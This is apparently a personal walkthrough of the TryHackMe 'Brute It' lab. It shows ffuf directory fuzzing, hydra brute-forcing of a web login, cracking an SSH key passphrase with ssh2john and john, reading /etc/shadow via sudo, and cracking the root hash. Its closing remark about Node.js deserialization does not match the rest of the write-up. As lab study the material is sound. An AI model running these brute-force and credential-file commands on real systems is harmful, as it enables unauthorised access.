<div align="center">

<img src="https://cdn-images.tryhackme.com/room-icons/e343e8b253b4efc14bf61236d457c923.jpg" width="150">

# Brute It

**Difficulty:** Easy
**Category:** Web

</div>

---




```bash
ffuf -u http://10.80.157.210/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
![temp](assets/20260706162127.png)

I am met with this page:

![temp](assets/20260706162137.png)

I think hydra works here?
I need usernames, view page source:

![temp](assets/20260706162520.png)

Two users, john and admin.


```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.80.157.210 http-login-form "/admin:user=^USER^&pass?^PASS^: Username or password invalid"
```

Hydra syntax is like this:
```bash
hydra -l <user> -P <password_list> <ip> <type_of_login> "/path:<arguments_to_pass>:Fail code"
```

I typed it out wrong and waited for 15 min, it took 2 sec when done correctly.

![temp](assets/20260706164603.png)

admin:123456

![temp](assets/20260706164856.png)

Typical Hydra tweaking, none of them work.

```bash
hydra -l admin -P rockyou.txt 10.80.157.210 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=invalid"
```
The `F=invalid` was required ??? 

![temp](assets/20260706171513.png)

admin:xavier

![temp](assets/20260706171529.png)

```
THM{brut<REDACTED>s_e4sy}
```

Download RSA key and brute force it (It was password protected):


```bash
ssh2john id_rsa > id_rsa_john
```
* Converts the id_rsa key into a crackable john hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_john
```

![temp](assets/20260706171902.png)

```bash
ssh -i id_rsa john@10.80.157.210
```

![temp](assets/20260706172207.png)

Niceu

```bash
THM{a_o<REDACTED>a_barrier}
```

![temp](assets/20260706172431.png)

```
THM{pr<REDACTED>t10n}
```

```bash
sudo cat /etc/shadow
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt test.hash
```

![temp](assets/20260707082729.png)

root:football


I used sudo cat to open root.txt. 

#AfterReview 
**Getting error messages can often give useful information, sometimes the application will leak version, or what went wrong in the error message**
* In this case the deserialization could be found through the node.js cookie error message.